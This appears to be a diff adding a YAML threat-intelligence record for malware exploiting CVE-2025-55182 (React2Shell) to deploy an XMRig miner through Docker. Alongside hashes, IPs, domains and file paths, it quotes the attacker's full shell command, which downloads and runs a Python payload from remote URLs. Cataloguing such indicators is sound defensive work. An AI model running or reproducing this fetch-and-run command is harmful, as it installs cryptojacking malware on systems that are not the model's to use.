@@ -1,0 +1,47 @@
+description: AI-generated malware exploiting CVE-2025-55182 to deploy a crypto miner
+  via Docker container.
+malware_families:
+- React2Shell
+TTPs:
+  processes:
+  - dockerd
+  - python3
+  commandline:
+  - sh
+  - -c
+  - apt-get update -qq && apt-get install -y -qq wget curl python3 python3-pip || true && cd /tmp && wget -q no-check-certificate https://pastebin.co/raw/CcebtjHM -O requirements.txt || true && python3 -m pip install --upgrade pip setuptools wheel 2>/dev/null 2>&1 || true && python3 -m pip install -r /tmp/requirements.txt --no-cache-dir 2>/dev/null 2>&1 || true && wget -q --no-check-certificate https://smplu.link/dockerzero -O scanner.py && python3 -u /tmp/scanner.py -t 2000
+  scripting_engine:
+  - Python
+  network_connections:
+  - python-metrics-collector
+  - https://pastebin.co/raw/CcebtjHM
+  - 49.36.33.11
+  - pool.supportxmr.com:443
+  file_activity:
+  - /tmp/requirements.txt
+  - /tmp/scanner.py
+  - /tmp/xmrig-6.21.0/xmrig
+  persistence: []
+  process_relations:
+  - dockerd -> python-metrics-collector
+CVEs:
+- CVE-2025-55182
+IOCs:
+  hashes:
+  - 594ba70692730a7086ca0ce21ef37ebfc0fd1b0920e72ae23eff00935c48f15b
+  - d57dda6d9f9ab459ef5cc5105551f5c2061979f082e0c662f68e8c4c343d667d
+  ip_addresses:
+  - 49.36.33.11
+  domains:
+  - smplu.link
+  - pastebin.co
+  - pool.supportxmr.com
+  urls:
+  - https://pastebin.co/raw/CcebtjHM
+  - https://smplu.link/dockerzero
+authors:
+- Nathaniel Bill
+- Nathaniel Jones
+reference: https://www.darktrace.com/blog/ai-llm-generated-malware-used-to-exploit-react2shell
+date_of_publication: February 10, 2026
+file_creation_date: February 10, 2026
